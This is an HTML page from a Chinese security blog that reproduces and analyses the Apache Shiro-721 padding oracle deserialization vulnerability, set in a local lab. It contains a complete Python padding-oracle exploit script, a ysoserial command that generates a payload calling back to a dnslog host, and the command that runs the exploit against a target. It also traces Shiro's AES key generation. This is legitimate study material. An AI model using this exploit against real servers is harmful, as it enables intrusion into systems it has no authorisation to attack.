@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java反序列化Shiro篇02-Shiro721流程分析 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java反序列化Shiro篇02-Shiro721流程分析</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-03-08 21:43:04</span>
+        <span class="mobile">2023-03-08 21:43</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-03-10 22:03:00</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本来早该学习的洞，一直拖着了，拖到了现在，发现面试必考，还是想着早补早安心。</p>
+<p>在 Shiro550 漏洞中，Cookie 所使用的 AES 加密密钥为硬编码，所以我们可以构造恶意序列化数据并使用固定的 AES 密钥进行正确加密恶意序列发送给服务端，进而达到攻击的目的。但在该漏洞公布后，Shiro 官方修复了这一漏洞，将AES密钥修改成了动态生成。也就是说，对于每一个 Cookie，都是使用不同的密钥进行加解密的。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>先下载对应的 jar 包 <a target="_blank" rel="noopener" href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war">samples-web-1.4.1.war</a>，将 jar 包里面的内容解压一下，<code>samples-web-1.4.1\WEB-INF\lib</code> 中的 <code>CommonsCollections</code> 包版本修改为 3.2.1 </p>
+<p>接着新建项目包，选中 <code>web-app</code> 的 maven arch，将 samples-web-1.4.1 的包解压，放到 <code>webapp</code> 文件夹中，项目结构如图</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/structure.png" class="">
+
+<p>再把 <code>WEB-INF\lib</code> 加入 project structure 中</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/libAdd.png" class="">
+
+<p>之后再配 Tomcat 即可，如果不想自己搭建环境的话可以用我现成的环境<a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721</a></p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="漏洞利用前提条件"><a href="#漏洞利用前提条件" class="headerlink" title="漏洞利用前提条件"></a>漏洞利用前提条件</h3><p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p>
+<p>Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：</p>
+<ul>
+<li>开启 rememberMe 功能；</li>
+<li>rememberMe 值使用 AES-CBC 模式解密；</li>
+<li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；</li>
+<li>密文可控；</li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先正常登录进去，勾选上 rememberMe 选项：</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/login.png" class="">
+
+<p>刷新当前页面或访问 <code>/account</code> 页面，获取此时登录成功的 rememberMe 值：</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/accountRememberMe.png" class="">
+
+<p>使用 ysoserial 工具生成 URLDNS 验证 payload：</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http:&#x2F;&#x2F;5zfnof.dnslog.cn&quot; &gt; payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721">GitHub的exp</a>来进行 Padding Oracle Attack：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#https://github.com/3ndz/Shiro-721  </span>
+<span class="token comment"># -*- coding: utf-8 -*-  </span>
+<span class="token keyword">from</span> paddingoracle <span class="token keyword">import</span> BadPaddingException<span class="token punctuation">,</span> PaddingOracle  
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode  
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote<span class="token punctuation">,</span> unquote  
+<span class="token keyword">import</span> requests  
+<span class="token keyword">import</span> socket  
+<span class="token keyword">import</span> time  
+  
+<span class="token keyword">class</span> <span class="token class-name">PadBuster</span><span class="token punctuation">(</span>PaddingOracle<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+        <span class="token builtin">super</span><span class="token punctuation">(</span>PadBuster<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  
+        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+        self<span class="token punctuation">.</span>wait <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'wait'</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">)</span>  
+  
+    <span class="token keyword">def</span> <span class="token function">oracle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+        somecookie <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>unquote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>  
+        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'rememberMe'</span><span class="token punctuation">]</span> <span class="token operator">=</span> somecookie  
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'JSESSIONID'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+            <span class="token keyword">del</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'JSESSIONID'</span><span class="token punctuation">]</span>  
+        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>  
+            <span class="token keyword">try</span><span class="token punctuation">:</span>  
+                response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
+                        stream<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  
+                <span class="token keyword">break</span>  
+            <span class="token keyword">except</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+                logging<span class="token punctuation">.</span>exception<span class="token punctuation">(</span><span class="token string">'Retrying request in %.2f seconds...'</span><span class="token punctuation">,</span>  
+                                  self<span class="token punctuation">.</span>wait<span class="token punctuation">)</span>  
+                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>wait<span class="token punctuation">)</span>  
+                <span class="token keyword">continue</span>  
+  
+        self<span class="token punctuation">.</span>history<span class="token punctuation">.</span>append<span class="token punctuation">(</span>response<span class="token punctuation">)</span>  
+        <span class="token keyword">if</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token string">'deleteMe'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'No padding exception raised on %r'</span><span class="token punctuation">,</span> somecookie<span class="token punctuation">)</span>  
+            <span class="token keyword">return</span>  
+        <span class="token keyword">raise</span> BadPaddingException  
+  
+  
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  
+    <span class="token keyword">import</span> logging  
+    <span class="token keyword">import</span> sys  
+  
+    <span class="token keyword">if</span> <span class="token keyword">not</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span> <span class="token string">'Usage: %s &lt;url> &lt;somecookie value> &lt;payload>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>  
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  
+  
+    logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>  
+    encrypted_cookie <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>unquote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    padbuster <span class="token operator">=</span> PadBuster<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+    payload <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+    enc <span class="token operator">=</span> padbuster<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plaintext<span class="token operator">=</span>payload<span class="token punctuation">,</span> block_size<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>  
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'rememberMe cookies:'</span><span class="token punctuation">)</span>  
+    <span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>安装脚本不需要 <code>pip install paddingoracle</code>，直接将 GitHub 项目的 <code>paddingoracle.py</code> 放到同目录即可。</p>
+<p>运行该 exp 脚本进行爆破，因为是爆破，所以运行的时间会比较久一些，payload 如下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 exp.py http://192.168.5.3:8081/shiro721_war/account /COGnLcSO/3cUooGdYVDkQQNHrfZTNY+k0BCXPOmA9L+l7MRr3ZRYyuzDWZPNTSUFmFlkZWG+HJcecRLkdAMuxa43+i/hynQP7cYrDiulXmfTbuKmL8oz9DO9pmpUaumyCU0V3xfyLsv0+o3uYK/8Tlh9Ns+TMng3lMenVclDk3pjL/tPL/gfVFz50SMZw67WgdbG4mBzq0URLXG6d9yqB469ruPeKty5q3yjSfWDvOxJcR2OpUJg6dauiJNqwQwsu3FrkPmUlEAwZtQ/EpS9+74Ey5YVNuq350U00Df4ckmmHURCdRi/847d2dSHNQ80Wsoe4IseBOXabm6CBs+mcb4PWptM//E7CDaY6/UwTOm5yzK8/KSa+RNSXhHkOx4CH9wOyh8peq8bexGtoI1CzkqK54QwFkOzCu/bE9VPDU7ylZil3Xlc5oTDy79BHAZXfOgbUcgSSoV6OoOVG1DC6o6ptRYlFT0KBNjwS+ivFtbbA7kxf2Fq9K4tqxC2QI3 payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最终运行成功会给我们一个 rememberMe cookie 去打</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/PayloadProduce.png" class="">
+
+<p>这里我们将爆破生成的 cookie 替换进原本 <code>/account</code> 界面的 cookie 中去，发包，成功打到 DNS</p>
+<p>当然也可以使用现成的工具 <a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">ShiroExploit.V2.51</a>，输入测试网址以及登录用户的 Cookie</p>
+<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><blockquote>
+<p>这里相关原理可以看鸿哥写的文章 ———— <a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a><br>我对于漏洞的分析就直接在这基础之上总结一下</p>
+</blockquote>
+<h3 id="Padding-Oracle-Attack-构造加密数据分析"><a href="#Padding-Oracle-Attack-构造加密数据分析" class="headerlink" title="Padding Oracle Attack 构造加密数据分析"></a>Padding Oracle Attack 构造加密数据分析</h3><p>网上讲的文章大多数都是讲的如何使用 Padding Oracle Attack 来获取明文。但是这种场景在 Apache Shiro Padding Oracle Attack 这个漏洞场景中就不适用了。在这个场景中，我们需要构造恶意加密数据，进行解密后反序列化。</p>
+<p>此处内容参考自 <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89</a></p>
+<p>这里简单说下 Padding Oracle Attack 加密数据整体过程：</p>
+<ol>
+<li>选择一个明文 <code>P</code>，用来生成你想要的密文<code>C</code>；</li>
+<li>使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；</li>
+<li>生成一个随机数据块（<code>C[n]</code> 表示最后一个密文块）；</li>
+<li>对于每一个明文块，从最后一块开始：<ol>
+<li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块<code>C[n+1]</code>（如果是第一轮则是随机块）组合成的；</li>
+<li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li>
+<li>在计算完整个块之后，将它与明文块 <code>P[n]</code> 进行XOR一起创建 <code>C[n]</code>；</li>
+<li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li>
+</ol>
+</li>
+</ol>
+<p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。</p>
+<h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><h4 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h4><p>在 Shiro550 中，密钥是硬编码，就像下面这样</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PrincipalCollection</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setCipherKey</span><span class="token punctuation">(</span>DEFAULT_CIPHER_KEY_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而在 Shiro721 中，密钥的生成方式变为了动态生成</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PrincipalCollection</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">AesCipherService</span> cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>cipherService <span class="token operator">=</span> cipherService<span class="token punctuation">;</span>
+        <span class="token function">setCipherKey</span><span class="token punctuation">(</span>cipherService<span class="token punctuation">.</span><span class="token function">generateNewKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEncoded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以跟进调试一下，断点下在 <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code> 下，shiro 通过 <code>generateNewKey()</code> 方法获取密钥，跟进</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/generateNewKey.png" class="">
+
+<p>这里获取到了一个随机数生成器 <code>SecureRandom</code>， 跟进 <code>init()</code></p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/init.png" class="">
+
+<p>往下看，这里 var4 是 <code>AESKeyGenerator</code>，跟进 <code>engineInit()</code> 方法，进行了 AES 算法的初始化。</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineInit.png" class="">
+
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineInitAG.png" class="">
+
+<p>回到 <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code>，跟进 <code>generateKey()</code> 方法</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/generateKey.png" class="">
+
+<p>这里需要手动在 <code>com.sun.crypto.provider.AESKeyGenerator#engineGenerateKey()</code> 方法下个断点，不然不会停在这里。</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineGenerateKey.png" class="">
+
+<p>可见这里已经生成了一串16字节的随机序列，并且返回一个 <code>SecretKeySpec</code> 对象，再使用<code>getEncoded()</code> 方法获取 <code>key</code> 密钥序列。</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SecretKeySpec.png" class="">
+
+<p>至此就是 Shiro721 完整的密钥生成过程。</p>
